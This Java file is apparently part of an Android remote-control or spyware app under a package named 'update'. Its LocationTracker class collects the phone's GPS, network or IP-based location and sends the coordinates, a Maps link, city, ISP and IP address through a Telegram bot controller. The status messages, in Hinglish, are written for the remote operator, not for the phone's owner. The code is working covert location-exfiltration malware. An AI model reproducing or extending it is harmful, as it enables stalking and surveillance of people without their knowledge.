package com.kasari.update;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.*;
import android.os.*;
import androidx.core.content.ContextCompat;
import java.io.*;
import java.net.*;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.*;
import org.json.JSONObject;

public class LocationTracker {

    public static void getLocation(Context ctx) {
        // Check permission
        boolean hasFine = ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED;
        boolean hasCoarse = ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION)
                == PackageManager.PERMISSION_GRANTED;

        if (!hasFine && !hasCoarse) {
            TelegramController.sendMessage("❌ Location permission nahi hai. App dobara open karo aur permission do.");
            return;
        }

        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);

            // Step 1: Try last known location
            Location best = null;
            for (String p : new String[]{LocationManager.GPS_PROVIDER,
                    LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER}) {
                try {
                    if (lm.isProviderEnabled(p)) {
                        Location l = lm.getLastKnownLocation(p);
                        if (l != null && (best == null || l.getAccuracy() < best.getAccuracy()))
                            best = l;
                    }
                } catch (Exception ignored) {}
            }

            // Step 2: Request live location (15s timeout)
            TelegramController.sendMessage("📍 Location dhundh raha hun...");
            final Location[] fresh = {best};
            final CountDownLatch latch = new CountDownLatch(1);
            android.os.HandlerThread ht = new android.os.HandlerThread("LocThread");
            ht.start();
            android.os.Handler locHandler = new android.os.Handler(ht.getLooper());
            LocationListener listener = loc -> { fresh[0] = loc; latch.countDown(); };
            boolean requested = false;
            for (String p : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER}) {
                try {
                    if (lm.isProviderEnabled(p)) {
                        lm.requestSingleUpdate(p, listener, ht.getLooper());
                        requested = true; break;
                    }
                } catch (Exception ignored) {}
            }
            if (requested) latch.await(15, TimeUnit.SECONDS);
            try { lm.removeUpdates(listener); } catch (Exception ignored) {}
            ht.quit();

            Location loc = fresh[0];
            if (loc != null) {
                double lat = loc.getLatitude(), lon = loc.getLongitude();
                String time = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault())
                    .format(new Date(loc.getTime()));
                TelegramController.sendMessage(
                    "📍 Location (GPS/Network)\n" +
                    "Lat: " + lat + "\nLon: " + lon + "\n" +
                    "Maps: https://maps.google.com/?q=" + lat + "," + lon + "\n" +
                    "Accuracy: " + (int) loc.getAccuracy() + "m\n" +
                    "Time: " + time);
                return;
            }

            // Step 3: IP-based fallback
            TelegramController.sendMessage("📍 GPS nahi mila, IP geolocation try kar raha hun...");
            try {
                URL url = new URL("http://ip-api.com/json/?fields=status,lat,lon,city,regionName,country,isp,query");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(8000); conn.setReadTimeout(8000);
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                br.close(); conn.disconnect();
                JSONObject json = new JSONObject(sb.toString());
                if ("success".equals(json.optString("status"))) {
                    double lat = json.getDouble("lat"), lon = json.getDouble("lon");
                    TelegramController.sendMessage(
                        "📍 IP Location (GPS OFF)\n" +
                        "Lat: " + lat + "\nLon: " + lon + "\n" +
                        "Maps: https://maps.google.com/?q=" + lat + "," + lon + "\n" +
                        "City: " + json.optString("city") + ", " + json.optString("regionName") + "\n" +
                        "Country: " + json.optString("country") + "\n" +
                        "ISP: " + json.optString("isp") + "\n" +
                        "IP: " + json.optString("query") + "\n" +
                        "⚠️ Approximate (GPS se less accurate)");
                } else {
                    TelegramController.sendMessage("❌ IP location bhi fail. Internet check karo.");
                }
            } catch (Exception e) {
                TelegramController.sendMessage("❌ Location nahi mili: " + e.getMessage());
            }
        } catch (Exception e) {
            TelegramController.sendMessage("❌ Location error: " + e.getMessage());
        }
    }
}
